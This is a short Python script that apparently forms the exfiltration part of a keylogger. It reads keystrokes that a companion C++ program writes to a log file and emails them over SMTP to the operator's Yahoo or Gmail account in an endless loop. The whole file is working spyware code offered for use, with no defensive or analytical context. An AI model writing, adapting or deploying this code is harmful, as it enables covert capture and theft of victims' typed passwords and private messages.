#!/usr/bin/python

import smtplib
import sys
from time import sleep
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

email = 'YOUR EMAIL' # Replace with your email
passw = 'YOUR EMAIL PASSWORD' # Replace with your email password
logfile = 'logfile.txt' # This is the name of the file where the C++ program will write key logs
count = 1 # Number of email sent to you

smtp = smtplib.SMTP('smtp.mail.yahoo.com', 587) # Replace with 'smtp.gmail.com' if you are using a GMAIL
smtp.ehlo()
smtp.starttls()
smtp.login(email, passw)

def Send():
    global count
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Key #{}'.format(count)
    keylogs = ReadLogFile() + '\nWaiting 5 Mins Before Sending Again...'

    if 'Done!!' in keylogs:
        smtp.close()
        sys.exit(0)
    body = MIMEText(keylogs)
    msg.attach(body)
    smtp.sendmail(email, email, msg.as_string())
    count += 1

def ReadLogFile():
    try:
        with open(logfile, 'r') as fp:
            return fp.read()
    except:
        return 'Log File Has Not Been Created Yet'

def main():
    while True:
        Send()
        sleep(120) # Send Email Every 120 Seconds.

if __name__ == '__main__':
    main()
